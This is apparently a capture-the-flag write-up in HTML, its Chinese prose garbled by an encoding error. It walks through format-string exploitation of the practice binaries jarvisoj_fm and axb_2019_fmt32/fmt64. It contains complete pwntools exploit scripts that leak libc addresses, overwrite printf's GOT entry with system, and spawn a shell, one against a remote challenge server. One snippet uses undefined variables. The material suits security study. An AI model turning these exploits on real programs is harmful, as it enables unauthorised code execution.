<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><code>jarvisoj_fm</code></h2><p>â€‹	å…ˆçœ‹ä¸»å‡½æ•°ï¼Œç›´æ¥ç»™æˆ‘ä»¬<code>system(&quot;/bin/sh&quot;)</code>ï¼Œå½“<code>x == 4</code>çš„æ—¶å€™æ‰èƒ½æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬çœ‹åˆ°ç¬¬<code>10</code>è¡Œæœ‰ä¸ª<code>printf(buf)</code>å†ç»“åˆç¬¬<code>9</code>è¡Œï¼Œä¸éš¾çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æŠŠ<code>x</code>å†™æˆ<code>4</code>ï¼Œå°±å¯ä»¥æ‹¿åˆ°<code>shell</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png" alt="image-20240131182232759"></p>
<p>â€‹	å…ˆè®¡ç®—åç§»é‡ï¼Œåç§»é‡ä¸º<code>11</code>ï¼Œç„¶åæ„é€ <code>payload</code>ã€‚æˆ‘ä»¬è¦å†™å…¥çš„å†…å®¹æ˜¯<code>4</code>ï¼Œå·§çš„æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„åœ°å€ä¹Ÿæ˜¯<code>4</code>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å‘é€åœ°å€å°±å¯ä»¥å†™äº†ï¼Œ<code>payload = p32(value_addr)+b&#39;%11$n&#39;</code>ã€‚</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">value_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(value_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931380.png" alt="image-20240129124847881"></p>
<p>â€‹	æˆ‘ä»¬çœ‹åˆ°<code>read</code>å‡½æ•°ï¼Œå¯ä»¥è¯»å…¥<code>0x100(256)</code>ä¸ªå­—èŠ‚ï¼Œè€Œ<code>s</code>çš„é•¿åº¦ä¸º<code>257</code>ï¼Œå› æ­¤æ²¡æœ‰åŠæ³•æº¢å‡ºã€‚ç»§ç»­å¾€ä¸‹çœ‹ï¼Œ<code>printf(format)</code>è¿™ä¸€è¡Œæ˜æ˜¾å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¨‹åºä¸­ä¹Ÿæ²¡æœ‰<code>system</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚é‚£å¤§æ¦‚æ€è·¯å°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼<code>printf</code>çš„åœ°å€ï¼ˆæœ¬æ¥æˆ‘æƒ³ä¿®æ”¹<code>read</code>çš„<code>got</code>è¡¨å€¼çš„ï¼Œä½†æ˜¯åæ¥æ‰ç›¸ç­‰ä¿®æ”¹åå°±ç›¸å½“äºç¨‹åºä¸­æ²¡æœ‰<code>read</code>å‡½æ•°äº†ï¼Œè¿™æ ·è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼‰ï¼Œç®—å‡º<code>libc</code>åŸºåœ°å€ä»¥åŠ<code>system</code>å‡½æ•°åœ°å€ã€‚</p>
<p>â€‹	æ€ä¹ˆæ³„æ¼<code>printf</code>çš„åœ°å€å‘¢ï¼Ÿæœ¬é¢˜ä¸­æˆ‘ä»¬é€šè¿‡<code>read</code>å‡½æ•°å°†è¾“å…¥çš„å†…å®¹å†™åˆ°<code>s</code>ä¸­ï¼Œè€Œ<code>s</code>åˆæ˜¯<code>printf</code>å‡½æ•°çš„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»æ³„æ¼æ ˆä¸Šçš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥å…ˆæŠŠ<code>printf</code>åœ¨<code>got</code>è¡¨ä¸­å€¼å†™åˆ°æ ˆä¸Šï¼Œå†å»æ³„æ¼ç¨‹åºè¿è¡Œèµ·æ¥å<code>printf</code>åœ¨<code>got</code>è¡¨ä¸­çš„åœ°å€å³<code>printf</code>çš„çœŸå®åœ°å€ã€‚è¿™å°±éœ€è¦è®¡ç®—æˆ‘ä»¬å†™å…¥çš„å†…å®¹åœ¨æ ˆä¸Šçš„ä½ç½®çš„åç§»é‡ï¼Œè¾“å…¥<code>aaaa %p %p %p %p %p %p %p %p %p %p %p</code>å¾—åˆ°è¾“å‡ºçš„å†…å®¹æ•°ä¸€ä¸‹åç§»é‡ä¸º<code>8</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931580.png" alt="image-20240129132814049"></p>
<p>â€‹	ä¸è¿‡æˆ‘ä»¬ä¹Ÿå‘ç°äº†<code>0x20616161</code>ä¸­åªæœ‰<code>3</code>ä¸ª<code>a</code>ï¼Œæ˜¯å› ä¸º<code>format</code>ä¸­è¿˜æœ‰<code>Repeater:</code>è¿™äº›å­—ç¬¦çš„åŸå› ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç€å†è¾“å…¥<code>Aaaaa %p %p %p %p %p %p %p %p</code>ï¼Œå‘ç°<code>0x61616161</code>åˆšå¥½å°±æ˜¯<code>aaaa</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931608.png" alt="image-20240129140029043"></p>
<p>â€‹	å¾—åˆ°åç§»é‡åå¯ä»¥å¼€å§‹æ„é€ ç¬¬ä¸€ä¸ª<code>payload</code>æ³„æ¼<code>printf</code>åœ°å€äº†ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br></pre></td></tr></table></figure>

<p>â€‹	å¾—åˆ°<code>printf</code>çœŸå®åœ°å€åï¼Œå¯ä»¥è®¡ç®—<code>libc</code>åŸºåœ°å€ä»¥åŠ<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶æŠŠ<code>printf</code>çš„<code>got</code>è¡¨å€¼æ”¹æˆ<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å†æ¬¡ä¼ å…¥å‚æ•° <code>&#39;/bin/sh&#39;</code> å†æ‰§è¡Œ<code>printf</code>æ—¶ï¼Œç”±äºå°†<code>got</code>è¡¨ç»™ä¿®æ”¹äº†ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº†<code>system</code> å‡½æ•° å³ï¼šæ‰§è¡Œ<code>system(&#39;/bin/sh&#39;)</code>ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåˆšå¼€å§‹æˆ‘æ”¹<code>puts</code>å‡½æ•°çš„<code>got</code>è¡¨ä¸è¡Œï¼Œå› ä¸ºå°±ç®—æŠŠ<code>puts</code>çš„<code>got</code>è¡¨çš„å€¼æ”¹æˆ<code>system</code>å‡½æ•°çš„<code>got</code>è¡¨å€¼ï¼Œæˆ‘ä»¬åé¢ä¹Ÿä¸ä¼šå†æ‰§è¡Œ<code>puts</code>å‡½æ•°ï¼Œä¹Ÿå°±æ‰§è¡Œä¸äº†<code>system</code>å‡½æ•°ã€‚</p>
<h3 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><p>â€‹	é¢˜ç›®å¦‚æœæ˜¯<code>32</code>ä½çš„ç¨‹åºï¼Œå¯ä»¥ç”¨<code>pwntools</code>ä¸­çš„<code>fmtstr_payload</code>å‡½æ•°ç›´æ¥ä¿®æ”¹åœ°å€ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931998.png" alt="image-20240129144017329"></p>
<h3 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><p>ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„ä¿®æ”¹ï¼Œè¿™ä¸ªæ–¹æ³•å¯¹<code>32</code>ä½å’Œ<code>64</code>ä½çš„éƒ½é€‚ç”¨ã€‚</p>
<p>â€‹	å…ˆæŠŠä¸¤ä¸ªåœ°å€æ‰“å°å‡ºæ¥ï¼Œå‘ç°å››ä¸ªå­—èŠ‚ä¸­åªæœ‰æœ€é«˜å­—èŠ‚<code>f7</code>æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä»¬éœ€è¦ä¿®æ”¹å<code>3</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯éœ€è¦è¿™æ ·ä¿®æ”¹<code>e3 --&gt; e2</code>ï¼Œ<code>10 --&gt; 29</code>ï¼Œ<code>20 --&gt; 40</code>ï¼ˆå½“ç„¶åœ°å€æ˜¯ä¸ç¡®å®šçš„ï¼Œè‚¯å®šä¸èƒ½ç›´æ¥æ”¹æ•°å­—ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931794.png" alt="image-20240130161627843"></p>
<p>â€‹	è™½ç„¶æ¯æ¬¡åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠæ¯æ¬¡çš„åœ°å€è¡¨ç¤ºå‡ºæ¥ã€‚<code>sys_addr&amp;0xff</code>å°†<code>sys_addr</code>ä¸<code>0xff</code>è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ï¼Œå¾—åˆ°çš„ç»“æœæŠŠ<code>sys_addr</code>çš„ä½<code>8</code>ä½ï¼ˆ<code>8</code>ä½<code>1</code>ä¸ªå­—èŠ‚ï¼‰ä¿ç•™ä¸‹æ¥äº†ï¼Œé«˜ä½è¢«å…¨éƒ¨ç½®é›¶ã€‚<code>sys_addr&amp;0xff00</code>å°†<code>sys_addr</code>äºŒè¿›åˆ¶å½¢å¼çš„ç¬¬<code>9</code>åˆ°<code>16</code>ä½ä¿å­˜ä¸‹æ¥äº†ï¼Œå…¶ä»–ä½å…¨éƒ¨ç½®é›¶ä¸¾ä¸ªä¾‹å­å°±æ˜¯<code>11111111 11111111 11111111</code>å˜æˆäº†<code>00000000 11111111 00000000</code>ã€‚<code>&gt;&gt;8</code>æ˜¯å†å°†ç»“æœå³ç§»<code>8</code>ä½å³<code>00000000 11111111 00000000</code>å˜æˆäº†<code>00000000 11111111</code>ã€‚<code>(sys_addr&amp;0xff00)&gt;&gt;8</code>å°±æ˜¯æŠŠ<code>sys_addr</code>çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ä¿ç•™ä¸‹æ¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931920.png" alt="image-20240130175341704" style="zoom:67%;" />

<p>â€‹	ç„¶åä¸‹é¢è¿™ä¸€æ­¥ä¸­<code>sys_addr1-(9+13)</code>å‡çš„æ˜¯<code>printf</code>ä¸­å‰é¢å‚æ•°å­—èŠ‚çš„æ€»å’Œï¼Œç¨‹åºä¸­çš„<code>Repeater:</code>æ˜¯<code>9</code>ä¸ªå­—èŠ‚ï¼Œ<code>payload2 = b&#39;a&#39;+p32(strlen_got)+p32(strlen_got+1)+p32(strlen_dot+2)</code>ä¸€å…±<code>13</code>ä¸ªå­—èŠ‚ã€‚ï¼ˆå…¶å®ä¸ºä»€ä¹ˆè¦è¿™æ ·æˆ‘ä¹Ÿä¸çŸ¥é“ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># å‰é¢å·²ç»è¾“å‡ºäº†0xa+0x10ä¸ªå­—ç¬¦ï¼Œè¦å‡å»</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># å‡å¦‚å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚æœ¬èº«æ¯”å€’æ•°ç¬¬ä¸€ä¸ªå­—èŠ‚å°ï¼Œé‚£å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚+0x100ï¼Œè¿™æ ·æ‰å¯ä»¥å†™å…¥æ­£ç¡®å­—èŠ‚</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># åŒç†</span></span><br><span class="line"></span><br><span class="line">result = system_addr_4-system_addr_3</span><br><span class="line">system_addr_4_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># åŒç†</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹	æœ€åæ„é€ <code>payload2</code>ï¼Œ<code>bytes(str(sys_addr1_value),encoding=&#39;utf-8&#39;)</code>çš„æ„æ€æ˜¯æŠŠ<code>sys_addr1-value</code>è½¬æ¢ä¸ºå­—èŠ‚ä¸²<code>bytes</code>ç±»å‹ã€‚<code>%hhn</code>æ˜¯ä¿®æ”¹ä½<code>1</code>ä¸ªå­—èŠ‚ï¼Œ<code>printf_got+1</code>ä¼šæŠŠ<code>printf_got</code>çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚å˜æˆå€’æ•°ç¬¬ä¸€ä¸ªï¼Œç„¶åå°±å¯ä»¥ä¿®æ”¹ä½<code>2</code>ä¸ªå­—èŠ‚äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># å‰é¢å·²ç»è¾“å‡ºäº†0xa+0x10ä¸ªå­—ç¬¦ï¼Œè¦å‡å»</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># å‡å¦‚å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚æœ¬èº«æ¯”å€’æ•°ç¬¬ä¸€ä¸ªå­—èŠ‚å°ï¼Œé‚£å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚+0x100ï¼Œè¿™æ ·æ‰å¯ä»¥å†™å…¥æ­£ç¡®å­—èŠ‚</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931882.png" alt="image-20240130173634524"></p>
<h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><code>axb_2019_fmt64</code></h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931312.png" alt="image-20240130200837648"></p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	ç¬¬ä¸€æ­¥ï¼Œè®¡ç®—åç§»é‡ä¸º<code>8</code></p>
<p>â€‹	<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931509.png" alt="image-20240130130959078"></p>
<p>â€‹	åˆ°äº†ä¸<code>32</code>ä½ç¨‹åºä¸ä¸€æ ·çš„åœ°æ–¹äº†ï¼Œæ³„æ¼åœ°å€è¿™é‡Œå¦‚æœæ˜¯æŒ‰ç…§<code>32</code>çš„å†™æˆ<code>payload = p64(puts)+b&#39;%8$saaaa&#39;</code>ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°å‘é€çš„æ•°æ®åœ¨<code>puts_got</code>ä¸<code>%8$s</code>ä¹‹é—´æœ‰å¾ˆå¤š<code>&#39;00&#39;</code>ï¼Œå­—ç¬¦ä¸²ä¸­çš„<code>&#39;00&#39;</code>å°±ä»£è¡¨ç»“æŸï¼Œæ‰€ä»¥åœ¨<code>printf</code>åˆ°<code>&#39;00&#39;</code>çš„æ—¶å€™å°±ä»¥ä¸ºå­—ç¬¦ä¸²åé¢æ²¡æœ‰å†…å®¹äº†ï¼Œåé¢çš„å†…å®¹ä¹Ÿå°±ä¸ä¼šè¢«<code>printf</code>äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932606.png" alt="å±å¹•æˆªå›¾ 2024-01-30 185641"></p>
<p>â€‹	å› æ­¤æˆ‘ä»¬ç°åœ¨è¦æ¢ä¸ªå†™æ³•æ„é€ <code>payload</code>ï¼Œ<code>payload = b&#39;%9$saaaa&#39;+p64(puts_got)</code>è¿™æ ·æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>&#39;00&#39;</code>å°±åœ¨åé¢äº†ï¼Œæœ‰ç”¨çš„å­—ç¬¦ä¸²ä¹Ÿå°±ä¸ä¼šå†è¢«æˆªæ–­äº†ã€‚<code>9</code>æ˜¯å› ä¸ºç°åœ¨<code>p64(puts_got)</code>å˜æˆäº†ç¬¬<code>2</code>ä¸ªå‚æ•°äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932056.png" alt="å±å¹•æˆªå›¾ 2024-01-30 191730"></p>
<p>â€‹	åˆšå¼€å§‹æˆ‘æ³„æ¼çš„æ˜¯<code>printf</code>å‡½æ•°çš„<code>got</code>è¡¨å€¼ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥çœ‹åˆ«çš„å¸ˆå‚…çš„<code>wp</code>æ³„æ¼çš„éƒ½æ˜¯<code>puts</code>å‡½æ•°å°±å¯ä»¥ï¼Œåæ¥æˆ‘ç”¨<code>read,strlen</code>è¿™äº›å‡½æ•°éƒ½å¯ä»¥ã€‚ç„¶åæˆ‘å‘ç°<code>puts</code>å‡½æ•°å‘é€çš„æ˜¯<code>0x601018</code>ï¼ˆé‡å®šä½å‰ï¼‰ï¼Œæ¥æ”¶çš„æ˜¯<code>0x7fd7f1458690</code>ï¼ˆé‡å®šä½åï¼‰</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932500.png" alt="å±å¹•æˆªå›¾ 2024-01-30 184334"></p>
<p>â€‹	è€Œ<code>printf</code>å‡½æ•°å‘é€çš„ä¸æ¥æ”¶çš„ä¸€æ ·éƒ½æ˜¯<code>0x601030</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¹¶æ²¡æœ‰æ³„æ¼å‡º<code>printf</code>é‡å®šä½åçš„<code>got</code>è¡¨å€¼ï¼Œæ‰€ä»¥å°±ä¸èƒ½æ³„æ¼<code>printf</code>çš„<code>got</code>è¡¨å€¼</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932215.png" alt="å±å¹•æˆªå›¾ 2024-01-30 184858"></p>
